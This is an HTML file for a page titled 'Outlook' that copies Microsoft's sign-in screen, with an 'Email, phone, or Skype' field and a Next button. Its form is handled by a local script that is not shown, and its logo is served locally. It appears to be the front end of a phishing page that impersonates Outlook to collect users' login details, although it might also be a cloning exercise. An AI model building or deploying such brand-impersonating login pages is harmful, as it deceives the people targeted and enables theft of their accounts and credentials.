<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, shrink-to-fit=no" />

    <!-- Bootstrap CSS -->
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"
      integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N"
      crossorigin="anonymous" />
    <title>Outlook</title>
  </head>
  <body>
    <div class="container">
      <div class="row">
        <div class="col-md-3"></div>
        <div class="col-md-6 mt-4 ml-2">
          <img src="/image/RE1Mu3b.png" alt="" style="height: 33px" />
          <div>
            <h1
              style="font-size: 35px; font-weight: 600; color: black"
              class="mt-4">
              Sign in
            </h1>
            <p style="font-size: 18px; font-weight: 400; margin-bottom: 0px">
              to continue to Outlook
            </p>
          </div>

          <form id="form">
            <label for="email"></label>
            <input
              required
              name="email"
              type="email"
              id="email"
              placeholder="Email, phone, or Skype"
              style="
                width: 100%;
                padding-top: 10px;
                padding-bottom: 10px;
                border: solid 0px white;
                font-size: 20px;
                margin-top: 0px;
                outline: none;
              " />

            <div
              style="height: 1.5px; background-color: grey; width: 100%"
              class="mb-5"></div>
            <div style="display: flex; justify-content: flex-end">
              <button
                id="next"
                style="
                  background-color: rgb(65, 65, 125);
                  font-size: 22px;
                  padding-top: 6px;
                  padding-bottom: 6px;
                  padding-left: 42px;
                  padding-right: 42px;
                  color: white;
                  border: solid 1px white;
                ">
                Next
              </button>
            </div>
          </form>
        </div>
        <div class="col-md-3"></div>
      </div>
    </div>
    <script src="./js/index.js"></script>
    <script
      src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"
      integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj"
      crossorigin="anonymous"></script>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct"
      crossorigin="anonymous"></script>
  </body>
</html>
